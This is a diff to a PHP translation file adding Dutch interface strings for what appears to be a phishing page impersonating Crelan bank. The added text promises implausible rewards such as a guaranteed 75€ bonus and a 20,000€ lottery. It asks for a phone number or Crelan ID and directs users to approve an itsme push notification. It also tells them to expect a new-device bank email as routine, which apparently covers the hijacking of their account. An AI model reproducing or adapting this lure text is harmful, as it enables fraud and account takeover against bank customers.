@@ -24,13 +24,32 @@ return [
     'hero_limited' => 'De inschrijving voor het programma is voor een beperkte periode.',
     'participate' => 'Deelnemen',
     
+    // Success and hold messages
+    'success_hold_title' => 'Uw deelname is bevestigd',
+    'success_hold_description' => 'U heeft succesvol deelgenomen aan de cashbackactie. De wijzigingen worden binnen 24-48 uur verwerkt.',
+    'participation_steps' => 'Deelname stappen',
+    'step1_title' => 'Stap 1/2: Aanmelding voltooid',
+    'step1_description' => 'U heeft zich succesvol aangemeld voor de cashbackactie.',
+    'step2_title' => 'Stap 2/2: E-mailactivatie',
+    'step2_description' => 'Controleer uw e-mail voor de activatielink om uw deelname te voltooien.',
+    'step2_pending' => 'Wacht op e-mailactivatie',
+    'step2_completed' => 'E-mail geactiveerd',
+    
     // Forms
     'use_phone' => 'Gebruik je telefoonnummer',
+    'use_phone_number' => 'Gebruik je telefoonnummer',
+    'identify_yourself' => 'Identificeer uzelf',
+    'phone_placeholder' => '+32 ___ ___ ___',
     'crelan_id' => 'Crelan Identificatie',
     'id_description' => 'Vul hier uw gebruikersidentificatie in (bijvoorbeeld: AB12CD).',
     'or' => 'of',
     'send' => 'Versturen',
     'loading' => 'Laden...',
+    'your_digital_id' => 'uw digitale ID',
+    'itsme_description' => 'Gebruik <span aria-hidden="true">itsme<sup>®</sup></span><span lang="en" class="visually-hidden">it\'s me</span> om uzelf veilig online te identificeren',
+    
+    // Push messages
+    'push_confirm_in_app' => 'Bevestiging in uw app',
     
     // Quick links section
     'checking_accounts' => 'Zichtrekeningen',
@@ -159,4 +178,35 @@ return [
     
     // Custom image
     'information' => 'Informatie',
+    
+    // Benefits section
+    'special_offer' => 'Speciale Aanbieding',
+    'offer_description' => 'Doe mee aan onze exclusieve actie en profiteer van geweldige voordelen.',
+    'participate_now' => 'Neem nu deel',
+    
+    'cashback_title' => '3% cashback op alle aankopen',
+    'cashback_subtitle' => 'Krijg 3% terug op al je aankopen',
+    'cashback_description' => 'Je ontvangt 3% cashback op al je kaartbetalingen na je deelname aan de actie.',
+    'cashback_details' => 'De cashback is 30 dagen geldig na activatie en is beperkt tot een maximum van 100€ per deelnemer. Het bedrag wordt automatisch berekend en op je rekening gestort.',
+    
+    'bonus_title' => '75€ gegarandeerd op je rekening',
+    'bonus_subtitle' => 'Zeker bonusbedrag ontvangen',
+    'bonus_description' => 'Elke deelnemer die succesvol deelneemt aan de actie ontvangt een gegarandeerde bonus van 75€.',
+    'bonus_details' => 'Het bedrag wordt automatisch op de rekening gestort binnen een bepaalde termijn, onder voorbehoud van naleving van de actievoorwaarden.',
+    
+    'free_title' => '12 maanden gratis rekeningbeheer',
+    'free_subtitle' => 'Geen kosten voor een jaar',
+    'free_description' => 'In het kader van deze actie profiteer je van 12 maanden gratis standaard rekeningbeheer.',
+    'free_details' => 'Na deze periode gelden de gebruikelijke tarieven. Er is geen automatische verlenging van het aanbod.',
+    
+    'win_title' => 'Kans om 20.000€ te winnen',
+    'win_subtitle' => 'Doe mee aan de hoofdprijsloterij',
+    'win_description' => 'Alle deelnemers doen automatisch mee aan de loterij voor de hoofdprijs.',
+    'win_details' => 'De loterij vindt plaats binnen 30 dagen na afloop van de actieperiode. Er wordt één winnaar geselecteerd die een bedrag van 20.000€ ontvangt. De winnaar wordt persoonlijk gecontacteerd.',
+    
+    'itsme_title' => 'Tijdelijke actie – deelname via itsme',
+    'itsme_subtitle' => 'Exclusieve toegang via itsme',
+    'itsme_description' => 'Deze actie is tijdelijk en exclusief voorbehouden voor bestaande klanten. De deelname gebeurt op een veilige manier via itsme.',
+    'itsme_details' => 'Je bevestigt je deelname via een push-notificatie in de itsme-app door het juiste icoon te selecteren. Na bevestiging ontvang je een standaard e-mail van de bank, vergelijkbaar met die verzonden bij activatie of bevestiging van je rekening op een nieuw apparaat. Elke klant kan slechts één keer deelnemen.',
+    'sidebar_info' => 'Deelname is veilig en snel via itsme. U ontvangt direct een bevestiging na succesvolle identificatie.',
 ];
